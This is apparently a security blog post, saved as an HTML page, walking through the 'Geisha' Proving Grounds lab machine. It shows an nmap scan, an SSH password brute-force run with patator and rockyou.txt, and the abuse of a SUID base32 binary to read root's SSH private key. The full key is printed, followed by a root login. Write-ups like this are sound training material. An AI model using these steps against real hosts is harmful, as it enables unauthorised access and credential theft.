@@ -1,0 +1,86 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Geisha - OSPG | Infomation Security - Blog</title><meta name="description" content="SummaryWe’ll obtain the initial access by brute-force SSH password of the user geisha. Privilege escalation can be done via a misconfigured SUID binary base3...
+    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/geisha-ospg/"><meta property="og:description" content="
+    Blog"><meta property="og:title" content="Geisha - OSPG
+  "><link rel="canonical" href="https://jayngng.github.io/blog/geisha-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Geisha - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> November 15, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ospg">ospg</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//offensive">offensive</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 3 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h2 id="summary"><strong>Summary</strong></h2><p>We’ll obtain the initial access by brute-force SSH password of the user <code class="language-plaintext highlighter-rouge">geisha</code>. Privilege escalation can be done via a misconfigured <code class="language-plaintext highlighter-rouge">SUID</code> binary <code class="language-plaintext highlighter-rouge">base32</code>, which we’ll abuse to expose <code class="language-plaintext highlighter-rouge">root</code> SSH private key and fully compromise <code class="language-plaintext highlighter-rouge">root</code> access.</p><p><br></p><h2 id="enumeration"><strong>Enumeration</strong></h2><p>Let us begin with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE       REASON         VERSION
+21/tcp   open  ftp           syn-ack ttl 63 vsftpd 3.0.3      
+22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>                                                                     
+80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods:
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>                        
+|_http-title: Geisha
+7080/tcp open  ssl/empowerid syn-ack ttl 63 LiteSpeed                            
+| http-methods:       
+|_  Supported Methods: GET HEAD POST             
+|_http-server-header: LiteSpeed
+|_http-title: Did not follow redirect to https://192.168.199.82:7080/      
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>geisha/organizationName<span class="o">=</span>webadmin/countryName<span class="o">=</span>US/X509v3 Subject Alternative <span class="nv">Name</span><span class="o">=</span>DNS.1<span class="o">=</span>42.114.248.217
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>geisha/organizationName<span class="o">=</span>webadmin/countryName<span class="o">=</span>US/X509v3 Subject Alternative <span class="nv">Name</span><span class="o">=</span>DNS.1<span class="o">=</span>42.114.248.217
+7125/tcp open  http          syn-ack ttl 62 nginx 1.17.10
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nginx/1.17.10
+|_http-title: Geisha
+8088/tcp open  http          syn-ack ttl 63 LiteSpeed httpd
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: LiteSpeed
+|_http-title: Geisha
+9198/tcp open  http          syn-ack ttl 63 SimpleHTTPServer 0.6 <span class="o">(</span>Python 2.7.16<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
+|_http-title: Geisha
+</code></pre></div></div><p>Conducting a few web directory scans, we discovered the <code class="language-plaintext highlighter-rouge">/passwd</code> file on the HTTP service port 7125, which divulged <code class="language-plaintext highlighter-rouge">geisha</code> user.</p><h2 id="exploitation"><strong>Exploitation</strong></h2><h4 id="ssh-brute-force"><strong>SSH Brute-force</strong></h4><p>Running <code class="language-plaintext highlighter-rouge">patator</code> against the server, after a few minutes, we found <code class="language-plaintext highlighter-rouge">geisha</code> credentials.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atator ssh_login <span class="nv">host</span><span class="o">=</span>192.168.199.82 <span class="nv">user</span><span class="o">=</span>geisha <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">-x</span> ignore:mesg<span class="o">=</span><span class="s1">'Authentication failed.'</span>               
+03:34:21 patator    INFO - Starting Patator 0.9 <span class="o">(</span>https://github.com/lanjelot/patator<span class="o">)</span> with python-3.9.7 at 2021-11-15 03:34 EST
+03:34:21 patator    INFO -                                                                              
+03:34:21 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
+03:34:21 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
+03:37:25 patator    INFO - 0     39     0.476 | letmein                            |   512 | SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+^C03:39:51 patator    INFO - Hits/Done/Skip/Fail/Size: 1/919/0/0/14344392, Avg: 2 r/s, Time: 0h 5m 29s
+03:39:51 patator    INFO - To resume execution, pass <span class="nt">--resume</span> 92,93,91,93,92,92,91,93,91,91
+</code></pre></div></div><p>With this password, we can <code class="language-plaintext highlighter-rouge">ssh</code> our way in as <code class="language-plaintext highlighter-rouge">geisha</code>.</p><p><br></p><h2 id="privilege-escalation"><strong>Privilege Escalation</strong></h2><p>Enumerate the system locally, we found a misconfigured <code class="language-plaintext highlighter-rouge">SUID</code> binary.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geisha@geisha:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null<span class="p">;</span> 
+...                                                             
+/usr/bin/base32                                                                        
+...
+</code></pre></div></div><p>Attempting to read <code class="language-plaintext highlighter-rouge">root</code> SSH private key, we are able to compromise <code class="language-plaintext highlighter-rouge">root</code> access.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geisha@geisha:~<span class="nv">$ LFILE</span><span class="o">=</span>/root/.ssh/id_rsa
+geisha@geisha:~<span class="nv">$ </span><span class="nb">base32</span> <span class="s2">"</span><span class="nv">$LFILE</span><span class="s2">"</span> | <span class="nb">base32</span> <span class="nt">--decode</span>
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
+OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
+89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
+5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
+fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
+TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
+WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
+1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
+Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
+8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
+10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
+jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
+2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
+cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
+THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
+RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
+xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
+1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
+edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
+65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
+XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
+zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
+v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
+OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
+bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s<span class="o">=</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa root@192.168.199.82                                                                                                                                                                        130 ⨯
+Linux geisha 4.19.0-8-amd64 <span class="c">#1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@geisha:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2023 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>
